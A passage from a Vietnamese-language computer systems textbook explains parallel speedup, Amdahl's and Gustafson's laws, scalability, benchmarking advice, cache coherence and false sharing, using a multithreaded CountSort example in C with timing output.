Giảm độ dài của critical path là bước quan trọng đầu tiên trong việc song song hóa chương trình.</p>
<p>Ngoài ra, các <strong>điểm đồng bộ hóa thread</strong> và (đối với các chương trình chạy trên nhiều nút tính toán) <strong>chi phí giao tiếp giữa các process</strong> cũng là những yếu tố có thể giới hạn hiệu năng song song.</p>
<blockquote>
<p><strong>Không phải mọi chương trình đều là ứng viên tốt cho song song hóa!</strong><br />
Độ dài của critical path có thể khiến một số chương trình <strong>rất khó</strong> để song song hóa.<br />
Ví dụ: bài toán tính số Fibonacci thứ <em>n</em>.<br />
Vì mỗi số Fibonacci phụ thuộc vào <strong>hai số trước đó</strong>, nên việc song song hóa hiệu quả chương trình này là <strong>rất khó</strong>.</p>
</blockquote>
<p>Xét việc song song hóa hàm <code>countElems</code> trong thuật toán <strong>CountSort</strong> đã đề cập trước đó trong chương này.<br />
Trong thế giới lý tưởng, ta kỳ vọng speedup của chương trình sẽ <strong>tuyến tính</strong> theo số lượng core.<br />
Tuy nhiên, hãy đo thời gian chạy của nó (trong trường hợp này, chạy trên hệ thống <strong>quad-core</strong> với <strong>8 thread logic</strong>):</p>
<p>$ ./countElems_p_v3 100000000 0 1
Time for Step 1 is 0.331831 s</p>
<p>$ ./countElems_p_v3 100000000 0 2
Time for Step 1 is 0.197245 s</p>
<p>$ ./countElems_p_v3 100000000 0 4
Time for Step 1 is 0.140642 s</p>
<p>$ ./countElems_p_v3 100000000 0 8
Time for Step 1 is 0.107649 s</p>
<p>Bảng 1 cho thấy <strong>speedup</strong> và <strong>efficiency</strong> cho các lần thực thi đa luồng này:</p>
<div class="table-wrapper"><table><thead><tr><th>Number of threads</th><th>2</th><th>4</th><th>8</th></tr></thead><tbody>
<tr><td>Speedup</td><td>1.68</td><td>2.36</td><td>3.08</td></tr>
<tr><td>Efficiency</td><td>0.84</td><td>0.59</td><td>0.39</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 1.</strong> Kết quả benchmark hiệu năng</p>
<p>Mặc dù chúng ta đạt <strong>84% efficiency</strong> với 2 core, nhưng efficiency giảm xuống <strong>39%</strong> khi dùng 8 core.<br />
Hãy lưu ý rằng <strong>speedup lý tưởng</strong> bằng 8 đã <strong>không đạt được</strong>.<br />
Một lý do là <strong>overhead</strong> của việc phân công công việc cho các thread và việc cập nhật tuần tự mảng <code>counts</code> bắt đầu chiếm ưu thế khi số lượng thread tăng cao.<br />
Thứ hai, <strong>resource contention</strong> (tranh chấp tài nguyên) giữa 8 thread (hãy nhớ đây là bộ xử lý <strong>quad-core</strong>) làm giảm efficiency của core.</p>
<h4 id="amdahls-law"><a class="header" href="#amdahls-law">Amdahl's Law</a></h4>
<p>Năm 1967, <strong>Gene Amdahl</strong>, một kiến trúc sư máy tính hàng đầu tại IBM, đã dự đoán rằng <strong>tốc độ tối đa</strong> mà một chương trình máy tính có thể đạt được bị giới hạn bởi kích thước của thành phần <strong>bắt buộc phải tuần tự</strong> (hiện được gọi là <strong>Amdahl’s Law</strong>).</p>
<p>Nói chung, Amdahl’s Law phát biểu rằng:</p>
<ul>
<li>Mỗi chương trình đều có một phần <strong>có thể tăng tốc</strong> (tức là phần có thể tối ưu hóa hoặc song song hóa, ký hiệu <em>P</em>),</li>
<li>Và một phần <strong>không thể tăng tốc</strong> (tức là phần vốn dĩ tuần tự, ký hiệu <em>S</em>).</li>
</ul>
<p>Ngay cả khi thời gian thực thi của phần <em>P</em> được giảm xuống <strong>0</strong>, thì phần <em>S</em> vẫn tồn tại và cuối cùng sẽ <strong>chi phối hiệu năng</strong>.<br />
Vì <em>S</em> và <em>P</em> là các tỷ lệ, nên <em>S</em> + <em>P</em> = 1.</p>
<p>Xét một chương trình chạy trên 1 core mất thời gian T~1~.</p>
<ul>
<li>Phần tuần tự chiếm <em>S</em> × T~1~ thời gian.</li>
<li>Phần song song hóa (<em>P</em> = 1 − <em>S</em>) chiếm <em>P</em> × T~1~ thời gian.</li>
</ul>
<p>Khi chương trình chạy trên <em>c</em> core, phần tuần tự <strong>vẫn</strong> mất <em>S</em> × T~1~ thời gian (giả sử các điều kiện khác không đổi), nhưng phần song song hóa được chia cho <em>c</em> core.<br />
Do đó, mức cải thiện tối đa cho bộ xử lý song song với <em>c</em> core để chạy cùng một công việc là:</p>
<p><img src="C14-SharedMemory/_images/amdahl.png" alt="amdahl" /></p>
<p>Khi <em>c</em> tăng, thời gian thực thi trên bộ xử lý song song sẽ bị <strong>chi phối</strong> bởi phần tuần tự của chương trình.</p>
<p>Để hiểu tác động của Amdahl’s Law, xét một chương trình <strong>90% song song hóa</strong> và chạy trong 10 giây trên 1 core.<br />
Theo công thức:</p>
<ul>
<li><em>P</em> = 0.9</li>
<li><em>S</em> = 0.1</li>
</ul>
<p>Bảng 2 cho thấy <strong>tổng thời gian</strong> trên <em>c</em> core (T~<em>c</em>~) theo Amdahl’s Law và <strong>speedup</strong> tương ứng:</p>
<div class="table-wrapper"><table><thead><tr><th>Number of cores</th><th>Serial time (s)</th><th>Parallel time (s)</th><th>Total Time T~c~ (s)</th><th>Speedup (so với 1 core)</th></tr></thead><tbody>
<tr><td>1</td><td>1</td><td>9</td><td>10</td><td>1</td></tr>
<tr><td>10</td><td>1</td><td>0.9</td><td>1.9</td><td>5.26</td></tr>
<tr><td>100</td><td>1</td><td>0.09</td><td>1.09</td><td>9.17</td></tr>
<tr><td>1000</td><td>1</td><td>0.009</td><td>1.009</td><td>9.91</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 2.</strong> Ảnh hưởng của Amdahl’s Law lên một chương trình 10 giây với 90% khả năng song song hóa</p>
<p>Có thể thấy rằng, theo thời gian, <strong>phần tuần tự</strong> của chương trình bắt đầu chiếm ưu thế, và việc thêm nhiều core hơn gần như <strong>không còn tác dụng</strong>.</p>
<p>Một cách nhìn chính xác hơn là đưa công thức tính T~<em>c</em>~ của Amdahl vào công thức tính speedup:</p>
<p><img src="C14-SharedMemory/_images/amdahl_speed.png" alt="amdahl speed" /></p>
<p>Khi lấy giới hạn của công thức này, ta thấy rằng khi <em>c</em> tiến tới vô hạn, <strong>speedup tiến tới 1/<em>S</em></strong>.<br />
Trong ví dụ ở Bảng 2, speedup tiến tới 1/0.1 = <strong>10</strong>.</p>
<p>Ví dụ khác: xét một chương trình với <em>P</em> = 0.99 (tức 99% chương trình có thể song song hóa).<br />
Khi <em>c</em> tiến tới vô hạn, thời gian tuần tự (<em>S</em> = 0.01) bắt đầu chi phối hiệu năng.<br />
Do đó, speedup tiến tới 1/0.01 = <strong>100</strong>.<br />
Nói cách khác, ngay cả với <strong>một triệu core</strong>, tốc độ tối đa mà chương trình này đạt được cũng chỉ là 100.</p>
<blockquote>
<p><strong>Không phải đã hết hy vọng: Giới hạn của Amdahl’s Law</strong><br />
Khi tìm hiểu về Amdahl’s Law, cần xem xét <strong>mục đích</strong> ban đầu của Gene Amdahl.<br />
Theo lời ông, định luật này được đề xuất để chứng minh &quot;<em>tính đúng đắn liên tục của cách tiếp cận bộ xử lý đơn, và sự yếu kém của cách tiếp cận đa bộ xử lý khi áp dụng vào các bài toán thực tế với những bất thường đi kèm</em>”<sup class="footnote-reference"><a href="#1">1</a></sup>.<br />
Trong bài báo năm 1967, Amdahl viết: &quot;<em>Trong hơn một thập kỷ, nhiều người đã cho rằng cấu trúc của một máy tính đơn đã đạt tới giới hạn, và những bước tiến thực sự quan trọng chỉ có thể đạt được bằng cách kết nối nhiều máy tính lại với nhau để cho phép giải quyết hợp tác</em>”<sup class="footnote-reference"><a href="#1">1</a></sup>.</p>
</blockquote>
<p>Những nghiên cứu sau này đã thách thức một số giả định chính của Amdahl.<br />
Xem <a href="C14-SharedMemory/performance_advanced.html#_gustafson_barsis_law">Gustafson–Barsis Law</a> để tìm hiểu về giới hạn của Amdahl’s Law và một cách tiếp cận khác khi đánh giá lợi ích của song song hóa.</p>
<h4 id="references-2"><a class="header" href="#references-2">References</a></h4>
<ol>
<li>Gene Amdahl. &quot;Validity of the single processor approach to
achieving large scale computing capabilities&quot; <em>Proceedings of the
April 18-20, 1967, Spring Joint Computer Conference</em>. pp. 483---​485.
ACM. 1967.</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h3 id="1442-các-chủ-đề-nâng-cao-advanced-topics"><a class="header" href="#1442-các-chủ-đề-nâng-cao-advanced-topics">14.4.2. Các chủ đề nâng cao (Advanced Topics)</a></h3>
<h4 id="Định-luật-gustafsonbarsis"><a class="header" href="#Định-luật-gustafsonbarsis">Định luật Gustafson–Barsis</a></h4>
<p>Năm 1988, <strong>John L. Gustafson</strong>, một nhà khoa học máy tính và nhà nghiên cứu tại <strong>Sandia National Labs</strong>, đã viết một bài báo có tên <em>&quot;Reevaluating Amdahl's Law&quot;</em><sup class="footnote-reference"><a href="#1">1</a></sup>.<br />
Trong bài báo này, Gustafson đã chỉ ra một giả định quan trọng về việc thực thi chương trình song song — một giả định <strong>không phải lúc nào cũng đúng</strong>.</p>
<p>Cụ thể, <strong>Amdahl's Law</strong> ngụ ý rằng số lượng <strong>compute core</strong> (<em>c</em>) và tỷ lệ phần chương trình có thể song song hóa (<em>P</em>) là <strong>độc lập</strong> với nhau.<br />
Gustafson lưu ý rằng điều này &quot;<em>hầu như không bao giờ đúng</em>&quot;<sup class="footnote-reference"><a href="#1">1</a></sup>.</p>
<p>Trong khi việc đo hiệu năng của một chương trình bằng cách thay đổi số lượng core trên một tập dữ liệu cố định là một bài tập học thuật hữu ích, thì trong thực tế, <strong>nhiều core hơn</strong> (hoặc nhiều bộ xử lý hơn, như đã đề cập trong phần thảo luận về <strong>distributed memory</strong>) thường được bổ sung khi <strong>quy mô bài toán tăng</strong>.<br />
Gustafson viết<sup class="footnote-reference"><a href="#1">1</a></sup>: &quot;<em>Có lẽ thực tế nhất là giả định thời gian chạy là hằng số, chứ không phải kích thước bài toán</em>&quot;.</p>
<p>Do đó, theo Gustafson, phát biểu chính xác nhất là:<br />
&quot;<em>Lượng công việc có thể thực hiện song song thay đổi tuyến tính theo số lượng bộ xử lý</em>&quot;<sup class="footnote-reference"><a href="#1">1</a></sup>.</p>
<p>Xét một chương trình <strong>song song</strong> mất thời gian T~<em>c</em>~ để chạy trên hệ thống có <em>c</em> core.<br />
Gọi <em>S</em> là tỷ lệ phần chương trình <strong>bắt buộc phải tuần tự</strong>, mất <em>S</em> × T~<em>c</em>~ thời gian để chạy.<br />
Như vậy, phần có thể song song hóa của chương trình <em>P</em> = 1 − <em>S</em>, mất <em>P</em> × T~<em>c</em>~ thời gian để chạy trên <em>c</em> core.</p>
<p>Khi cùng chương trình này chạy trên <strong>một core duy nhất</strong>, phần tuần tự vẫn mất <em>S</em> × T~<em>c</em>~ (giả sử các điều kiện khác không đổi).<br />
Tuy nhiên, phần song song hóa (trước đây được chia cho <em>c</em> core) giờ phải chạy <strong>tuần tự</strong> trên một core, và mất <em>P</em> × T~<em>c</em>~ × <em>c</em> thời gian.<br />
Nói cách khác, thành phần song song sẽ mất <strong>gấp <em>c</em> lần</strong> thời gian trên hệ thống một core.</p>
<p>Từ đó, <strong>scaled speedup</strong> (tăng tốc có tỉ lệ) được tính như sau:</p>
<p><img src="C14-SharedMemory/_images/sspeedup.png" alt="sspeedup" /></p>
<p>Điều này cho thấy <strong>scaled speedup</strong> tăng <strong>tuyến tính</strong> theo số lượng đơn vị tính toán.</p>
<p>Xét lại ví dụ trước đây, trong đó <strong>99%</strong> chương trình có thể song song hóa (<em>P</em> = 0.99).<br />
Áp dụng công thức scaled speedup, tốc độ lý thuyết trên <strong>100 bộ xử lý</strong> sẽ là <strong>99.01</strong>.<br />
Trên <strong>1.000 bộ xử lý</strong>, sẽ là <strong>990.01</strong>.<br />
Lưu ý rằng <strong>hiệu suất</strong> (efficiency) vẫn giữ nguyên ở mức <em>P</em>.</p>
<p>Kết luận của Gustafson: &quot;<em>Speedup nên được đo bằng cách mở rộng kích thước bài toán theo số lượng bộ xử lý, chứ không phải cố định kích thước bài toán</em>&quot;<sup class="footnote-reference"><a href="#1">1</a></sup>.</p>
<p>Kết quả của Gustafson đáng chú ý vì nó cho thấy có thể đạt được <strong>tốc độ tăng dần</strong> bằng cách tăng số lượng bộ xử lý.<br />
Là một nhà nghiên cứu tại trung tâm siêu máy tính quốc gia, Gustafson quan tâm nhiều hơn đến việc <strong>làm được nhiều việc hơn</strong> trong cùng một khoảng thời gian.<br />
Trong nhiều lĩnh vực khoa học, khả năng phân tích nhiều dữ liệu hơn thường dẫn đến <strong>độ chính xác</strong> hoặc <strong>độ tin cậy</strong> của kết quả cao hơn.<br />
Công trình của Gustafson đã chứng minh rằng có thể đạt được <strong>tốc độ rất lớn</strong> trên số lượng bộ xử lý lớn, và đã <strong>khơi dậy lại sự quan tâm</strong> đối với xử lý song song<sup class="footnote-reference"><a href="#2">2</a></sup>.</p>
<h4 id="khả-năng-mở-rộng-scalability"><a class="header" href="#khả-năng-mở-rộng-scalability">Khả năng mở rộng (Scalability)</a></h4>
<p>Chúng ta mô tả một chương trình là <strong>scalable</strong> (có khả năng mở rộng) nếu hiệu năng được cải thiện (hoặc giữ nguyên) khi tăng số lượng tài nguyên (core, processor) hoặc kích thước bài toán.<br />
Hai khái niệm liên quan là <strong>strong scaling</strong> và <strong>weak scaling</strong>.<br />
Cần lưu ý rằng “weak” và “strong” trong ngữ cảnh này <strong>không</strong> chỉ ra <em>chất lượng</em> khả năng mở rộng của chương trình, mà chỉ là hai cách khác nhau để đo lường khả năng mở rộng.</p>
<p>Một chương trình được gọi là <strong>strongly scalable</strong> nếu việc tăng số lượng core/đơn vị xử lý trên một <strong>kích thước bài toán cố định</strong> mang lại cải thiện về hiệu năng.<br />
Chương trình thể hiện <strong>strong linear scalability</strong> nếu khi chạy trên <em>n</em> core, <strong>speedup</strong> cũng là <em>n</em>.<br />
Tất nhiên, <strong>Amdahl’s Law</strong> đảm bảo rằng sau một điểm nào đó, việc thêm core sẽ không còn ý nghĩa.</p>
<p>Một chương trình được gọi là <strong>weakly scalable</strong> nếu việc tăng kích thước dữ liệu <strong>cùng tỷ lệ</strong> với số lượng core (tức là kích thước dữ liệu cố định trên mỗi core/processor) dẫn đến hiệu năng giữ nguyên hoặc được cải thiện.<br />
Chúng ta nói chương trình có <strong>weak linear scalability</strong> nếu thấy hiệu năng tăng <em>n</em> lần khi khối lượng công việc trên mỗi core tăng theo hệ số <em>n</em>.</p>
<h4 id="lời-khuyên-chung-khi-đo-lường-hiệu-năng"><a class="header" href="#lời-khuyên-chung-khi-đo-lường-hiệu-năng">Lời khuyên chung khi đo lường hiệu năng</a></h4>
<p>Chúng ta kết thúc phần thảo luận về hiệu năng với một số lưu ý về <strong>benchmarking</strong> và hiệu năng trên <strong>hyperthreaded core</strong>.</p>
<p><strong>Chạy chương trình nhiều lần khi benchmark.</strong></p>
<blockquote>
<p>Trong nhiều ví dụ trong sách này, chúng ta chỉ chạy chương trình một lần để ước lượng thời gian chạy.<br />
Tuy nhiên, điều này <strong>không đủ</strong> cho các benchmark chính thức.<br />
Chạy một lần <strong>không bao giờ</strong> là phép đo chính xác thời gian chạy thực sự của chương trình!<br />
<strong>Context switch</strong> và các tiến trình khác đang chạy có thể tạm thời khiến thời gian chạy dao động mạnh.<br />
Do đó, tốt nhất là chạy chương trình <strong>nhiều lần</strong> và báo cáo <strong>thời gian trung bình</strong> cùng với nhiều thông tin chi tiết nhất có thể, bao gồm số lần chạy, độ biến thiên quan sát được (ví dụ: error bar, giá trị nhỏ nhất, lớn nhất, trung vị, độ lệch chuẩn) và điều kiện đo.</p>
</blockquote>
<p><strong>Cẩn thận với vị trí đo thời gian.</strong></p>
<blockquote>
<p>Hàm <code>gettimeofday</code> hữu ích để đo chính xác thời gian chạy của chương trình.<br />
Tuy nhiên, nó cũng có thể bị lạm dụng.<br />
Dù có thể bạn muốn đặt lời gọi <code>gettimeofday</code> chỉ quanh phần tạo và join thread trong <code>main</code>, nhưng cần cân nhắc <strong>chính xác</strong> bạn muốn đo cái gì.<br />
Ví dụ, nếu chương trình cần đọc một tệp dữ liệu ngoài như một phần bắt buộc của quá trình thực thi, thì thời gian đọc tệp <strong>nên</strong> được tính vào thời gian chạy của chương trình.</p>
</blockquote>
<p><strong>Lưu ý tác động của hyperthreaded core.</strong></p>
<blockquote>
<p>Như đã thảo luận trong <a href="C14-SharedMemory/index.html#_taking_a_closer_look_how_many_cores">phần mở đầu chương này</a> và <a href="C14-SharedMemory/../C5-Arch/modern.html#_multicore_and_hardware_multithreading">mục hardware multithreading</a>, <strong>hyper-threaded core</strong> (lõi logic) có thể thực thi nhiều thread trên một core vật lý.<br />
Trong một hệ thống 4 core với 2 thread logic mỗi core, ta nói hệ thống có 8 hyperthreaded core.<br />
Chạy chương trình song song trên 8 core logic trong nhiều trường hợp cho <strong>wall time</strong> tốt hơn so với chạy trên 4 core vật lý.<br />
Tuy nhiên, do <strong>resource contention</strong> (tranh chấp tài nguyên) thường xảy ra với hyperthreaded core, bạn có thể thấy hiệu suất mỗi core giảm và speedup không tuyến tính.</p>
</blockquote>
<p><strong>Cẩn thận với tranh chấp tài nguyên.</strong></p>
<blockquote>
<p>Khi benchmark, luôn cần xem xét các <strong>process</strong> hoặc ứng dụng đa luồng khác đang chạy trên hệ thống.<br />
Nếu kết quả hiệu năng trông bất thường, hãy nhanh chóng chạy <code>top</code> để xem có người dùng nào khác đang chạy tác vụ tiêu tốn tài nguyên trên cùng hệ thống hay không.<br />
Nếu có, hãy thử dùng hệ thống khác để benchmark (hoặc đợi đến khi hệ thống ít tải hơn).</p>
</blockquote>
<h4 id="tài-liệu-tham-khảo-7"><a class="header" href="#tài-liệu-tham-khảo-7">Tài liệu tham khảo</a></h4>
<ol>
<li>John Gustafson. “Reevaluating Amdahl’s law”. <em>Communications of the ACM</em> 31(5), tr. 532–533. ACM. 1988.</li>
<li>Caroline Connor. “Movers and Shakers in HPC: John Gustafson” <em>HPC Wire</em>.<br />
<a href="http://www.hpcwire.com/hpcwire/2010-10-20/movers_and_shakers_in_hpc_john_gustafson.html">http://www.hpcwire.com/hpcwire/2010-10-20/movers_and_shakers_in_hpc_john_gustafson.html</a></li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h2 id="145-tính-nhất-quán-bộ-nhớ-đệm-cache-coherence-và-chia-sẻ-sai-false-sharing"><a class="header" href="#145-tính-nhất-quán-bộ-nhớ-đệm-cache-coherence-và-chia-sẻ-sai-false-sharing">14.5. Tính nhất quán bộ nhớ đệm (Cache Coherence) và Chia sẻ sai (False Sharing)</a></h2>
<p><strong>Multicore cache</strong> (bộ nhớ đệm trên hệ thống đa lõi) có thể ảnh hưởng sâu sắc đến hiệu năng của một chương trình <strong>multithreaded</strong> (đa luồng).<br />
Trước tiên, hãy cùng điểm lại nhanh một số <a href="C14-SharedMemory/../C11-MemHierarchy/caching.html#_cpu_caches">khái niệm cơ bản liên quan đến thiết kế cache</a>:</p>
<ul>
<li>
<p>Dữ liệu/lệnh không được vận chuyển <strong>từng phần tử riêng lẻ</strong> vào cache.<br />
Thay vào đó, dữ liệu được truyền theo <strong>block</strong> (khối), và kích thước block thường <strong>lớn hơn</strong> ở các mức thấp hơn của <strong>memory hierarchy</strong> (hệ thống phân cấp bộ nhớ).</p>
</li>
<li>
<p>Mỗi cache được tổ chức thành một tập hợp (<strong>set</strong>), mỗi set chứa một số <strong>line</strong> (dòng).<br />
Mỗi line lưu trữ một block dữ liệu.</p>
</li>
<li>
<p>Các bit riêng lẻ của <strong>memory address</strong> (địa chỉ bộ nhớ) được dùng để xác định <strong>set</strong>, <strong>tag</strong>, và <strong>block offset</strong> trong cache — nơi sẽ ghi block dữ liệu.</p>
</li>
<li>
<p><strong>Cache hit</strong> xảy ra khi block dữ liệu mong muốn đã tồn tại trong cache.<br />
Ngược lại, <strong>cache miss</strong> xảy ra khi block không có trong cache, và hệ thống sẽ tìm kiếm ở mức thấp hơn của memory hierarchy (có thể là cache cấp thấp hơn hoặc <strong>main memory</strong>).</p>
</li>
<li>
<p><strong>Valid bit</strong> cho biết block tại một line cụ thể trong cache có thể được sử dụng an toàn hay không.<br />
Nếu valid bit = 0, block dữ liệu tại line đó <strong>không thể</strong> được sử dụng (ví dụ: block có thể chứa dữ liệu từ một process đã thoát).</p>
</li>
<li>
<p>Dữ liệu được ghi vào cache/bộ nhớ dựa trên hai chiến lược chính:</p>
<ul>
<li><strong>Write-through</strong>: dữ liệu được ghi đồng thời vào cache và main memory.</li>
<li><strong>Write-back</strong>: dữ liệu chỉ được ghi vào cache và sẽ được ghi xuống các mức thấp hơn trong hierarchy <strong>sau khi</strong> block bị loại bỏ (evict) khỏi cache.</li>
</ul>
</li>
</ul>
<h3 id="1451-cache-trên-hệ-thống-đa-lõi-caches-on-multicore-systems"><a class="header" href="#1451-cache-trên-hệ-thống-đa-lõi-caches-on-multicore-systems">14.5.1. Cache trên hệ thống đa lõi (Caches on Multicore Systems)</a></h3>
<p><a href="C14-SharedMemory/../C11-MemHierarchy/coherency.html#_looking_ahead_caching_on_multicore_processors">Nhớ lại</a> rằng, trong <strong>shared memory architecture</strong> (kiến trúc bộ nhớ chia sẻ), mỗi <strong>core</strong> có thể có cache riêng, và nhiều core có thể chia sẻ một cache chung.</p>
<p><strong>Hình 1</strong> minh họa một ví dụ CPU hai lõi (<strong>dual-core CPU</strong>).<br />
Mặc dù mỗi core có <strong>L1 cache</strong> riêng, nhưng cả hai core chia sẻ chung một <strong>L2 cache</strong>.</p>
<p><img src="C14-SharedMemory/_images/multicore-cache.png" alt="dual core processor with separate L1 caches and shared L2 cache" /></p>
<p><strong>Hình 1.</strong> Ví dụ CPU hai lõi với L1 cache riêng và L2 cache dùng chung</p>
<p>Nhiều <strong>thread</strong> trong cùng một chương trình thực thi có thể chạy các <strong>function</strong> khác nhau.<br />
Nếu không có <a href="C14-SharedMemory/../C11-MemHierarchy/coherency.html#_cache_coherency"><strong>cache coherence strategy</strong></a> (chiến lược đảm bảo tính nhất quán bộ nhớ đệm) để đảm bảo mỗi cache duy trì một góc nhìn nhất quán về bộ nhớ chia sẻ, các biến chia sẻ có thể bị cập nhật <strong>không đồng bộ</strong>.</p>
<p>Ví dụ: xét CPU hai lõi trong <strong>Hình 1</strong>, mỗi core đang chạy một thread riêng biệt <strong>đồng thời</strong>:</p>
<ul>
<li>Thread trên <strong>Core 0</strong> có biến cục bộ <code>x</code>.</li>
<li>Thread trên <strong>Core 1</strong> có biến cục bộ <code>y</code>.</li>
<li>Cả hai thread cùng chia sẻ quyền truy cập biến toàn cục <code>g</code>.</li>
</ul>
<p><strong>Bảng 1</strong> cho thấy một kịch bản thực thi có thể xảy ra:</p>
<div class="table-wrapper"><table><thead><tr><th>Time</th><th>Core 0</th><th>Core 1</th></tr></thead><tbody>
<tr><td>0</td><td>g = 5</td><td>(other work)</td></tr>
<tr><td>1</td><td>(other work)</td><td>y = g * 4</td></tr>
<tr><td>2</td><td>x += g</td><td>y += g * 2</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 1.</strong> Chia sẻ dữ liệu gây vấn đề do caching</p>
<p>Giả sử giá trị ban đầu của <code>g</code> là <strong>10</strong>, và giá trị ban đầu của <code>x</code> và <code>y</code> đều là <strong>0</strong>.<br />
Vậy giá trị cuối cùng của <code>y</code> sau chuỗi thao tác này là bao nhiêu?</p>
<p>Không có <strong>cache coherence</strong>, đây là câu hỏi rất khó trả lời, vì tồn tại ít nhất <strong>ba bản sao</strong> của <code>g</code>:</p>
<ol>
<li>Một bản trong <strong>L1 cache</strong> của Core 0.</li>
<li>Một bản trong <strong>L1 cache</strong> của Core 1.</li>
<li>Một bản khác trong <strong>L2 cache</strong> dùng chung.</li>
</ol>
<p><img src="C14-SharedMemory/_images/mc-cache-example.png" alt="A problematic update to the caches" /></p>
<p><strong>Hình 2.</strong> Một cập nhật gây vấn đề đối với cache không sử dụng cơ chế <strong>cache coherency</strong></p>
<p><strong>Hình 2</strong> minh họa một kết quả sai có thể xảy ra sau khi chuỗi thao tác trong <strong>Bảng 1</strong> hoàn tất.<br />
Giả sử L1 cache sử dụng <strong>write-back policy</strong> (chính sách ghi-lùi).<br />
Khi thread chạy trên <strong>Core 0</strong> ghi giá trị <code>5</code> vào <code>g</code>, nó chỉ cập nhật giá trị <code>g</code> trong <strong>L1 cache</strong> của Core 0.<br />
Giá trị <code>g</code> trong <strong>L1 cache</strong> của Core 1 vẫn là <code>10</code>, và bản sao trong <strong>L2 cache</strong> dùng chung cũng vẫn là <code>10</code>.<br />
Ngay cả khi sử dụng <strong>write-through policy</strong> (chính sách ghi-xuyên), cũng không có gì đảm bảo rằng bản sao <code>g</code> trong L1 cache của Core 1 sẽ được cập nhật!<br />
Trong trường hợp này, <code>y</code> sẽ có giá trị cuối cùng là <strong>60</strong>.</p>
<p>Một <strong>cache coherence strategy</strong> (chiến lược đảm bảo tính nhất quán bộ nhớ đệm) sẽ <strong>invalide</strong> (vô hiệu hóa) hoặc <strong>update</strong> (cập nhật) các bản sao dữ liệu chia sẻ trong các cache khác khi một cache ghi dữ liệu vào giá trị chia sẻ đó.<br />
<strong>Protocol Modified Shared Invalid (MSI)</strong> (xem chi tiết trong <a href="C14-SharedMemory/../C11-MemHierarchy/coherency.html#_the_msi_protocol">Chương 11.6</a>) là một ví dụ về <strong>invalidating cache coherence protocol</strong> (giao thức nhất quán bộ nhớ đệm kiểu vô hiệu hóa).</p>
<p>Một kỹ thuật phổ biến để triển khai MSI là <strong>snooping</strong>.<br />
Một <strong>snoopy cache</strong> sẽ “nghe lén” (snoop) trên <strong>memory bus</strong> để phát hiện các tín hiệu ghi.<br />
Nếu snoopy cache phát hiện một thao tác ghi vào một <strong>shared cache block</strong> (khối cache chia sẻ), nó sẽ <strong>invalidate</strong> line chứa block đó.<br />
Kết quả là chỉ còn <strong>một bản hợp lệ duy nhất</strong> của block nằm trong cache vừa được ghi, trong khi <strong>tất cả các bản sao khác</strong> của block trong các cache khác sẽ bị đánh dấu là <strong>invalid</strong>.</p>
<p>Việc áp dụng giao thức MSI với snooping sẽ cho ra kết quả đúng là gán giá trị <strong>30</strong> cho biến <code>y</code> trong ví dụ trước.</p>
<h3 id="1452-false-sharing"><a class="header" href="#1452-false-sharing">14.5.2. False Sharing</a></h3>
<p><strong>Cache coherence</strong> đảm bảo tính đúng đắn, nhưng nó cũng có thể gây ảnh hưởng tiêu cực đến hiệu năng.<br />
Hãy nhớ rằng khi thread trên Core 0 cập nhật <code>g</code>, <strong>snoopy cache</strong> sẽ <strong>invalidate</strong> không chỉ <code>g</code>, mà <strong>toàn bộ cache line</strong> chứa <code>g</code>.</p>
<p>Xét <a href="C14-SharedMemory/_attachments/countElems_p.c">phiên bản thử nghiệm ban đầu</a> của chúng ta khi <strong>parallelize</strong> (song song hóa) hàm <code>countElems</code> trong thuật toán <strong>CountSort</strong>.<br />
Để tiện theo dõi, hàm này được trích lại ở đây:</p>
<pre><code class="language-c">/*parallel version of step 1 (first cut) of CountSort algorithm:
 * extracts arguments from args value
 * calculates portion of the array this thread is responsible for counting
 * computes the frequency of all the elements in assigned component and stores
 * the associated counts of each element in counts array
*/
void *countElems(void *args){
    //extract arguments
    //ommitted for brevity
    int *array = myargs-&gt;ap;
    long *counts = myargs-&gt;countp;

    //assign work to the thread
    //compute chunk, start, and end
    //ommited for brevity

    long i;
    //heart of the program
    for (i = start; i &lt; end; i++){
        val = array[i];
        counts[val] = counts[val] + 1;
    }

    return NULL;
}
</code></pre>
<p>Trong phần thảo luận trước về hàm này, chúng ta đã chỉ ra rằng <strong>data race</strong> có thể khiến mảng <code>counts</code> không được điền đúng tập giá trị đếm.<br />
Bây giờ, hãy xem điều gì xảy ra nếu chúng ta thử <strong>đo thời gian</strong> chạy hàm này.<br />
Ta thêm code đo thời gian vào <code>main</code> bằng <code>gettimeofday</code> giống hệt như trong <a href="C14-SharedMemory/_attachments/countElems_p_v3.c">countElems_p_v3.c</a>.</p>
<p>Kết quả benchmark phiên bản ban đầu của <code>countElems</code> trên 100 triệu phần tử như sau:</p>
<pre><code>$ ./countElems_p 100000000 0 1
Time for Step 1 is 0.336239 s

$ ./countElems_p 100000000 0 2
Time for Step 1 is 0.799464 s

$ ./countElems_p 100000000 0 4
Time for Step 1 is 0.767003 s
</code></pre>
<p>Ngay cả <strong>khi không có bất kỳ cơ chế đồng bộ nào</strong>, phiên bản này của chương trình <strong>vẫn chạy chậm hơn</strong> khi số lượng thread tăng lên!</p>
<p>Để hiểu chuyện gì đang xảy ra, hãy xem lại mảng <code>counts</code>.<br />
Mảng <code>counts</code> lưu tần suất xuất hiện của mỗi số trong mảng đầu vào.<br />
Giá trị lớn nhất được xác định bởi biến <code>MAX</code>.<br />
Trong chương trình ví dụ, <code>MAX = 10</code>.<br />
Nói cách khác, mảng <code>counts</code> chiếm <strong>40 byte</strong> dung lượng.</p>
<p>Hãy nhớ rằng thông tin <a href="C14-SharedMemory/../C11-MemHierarchy/coherency.html#_looking_ahead_caching_on_multicore_processors">cache details</a> trên hệ thống Linux nằm trong thư mục <code>/sys/devices/system/cpu/</code>.<br />
Mỗi <strong>logical core</strong> có thư mục con <code>cpuk</code> (trong đó <code>k</code> là số thứ tự core).<br />
Mỗi thư mục <code>cpu</code> lại có các thư mục <code>index</code> riêng, biểu thị các cache có sẵn cho core đó.</p>
<p>Các thư mục <code>index</code> chứa nhiều tệp mô tả chi tiết về cache của từng logical core.<br />
Nội dung ví dụ của thư mục <code>index0</code> (thường tương ứng với L1 cache trên Linux) như sau:</p>
<pre><code>$ ls /sys/devices/system/cpu/cpu0/cache/index0
coherency_line_size      power            type
level                    shared_cpu_list  uevent
number_of_sets           shared_cpu_map   ways_of_associativity
physical_line_partition  size
</code></pre>
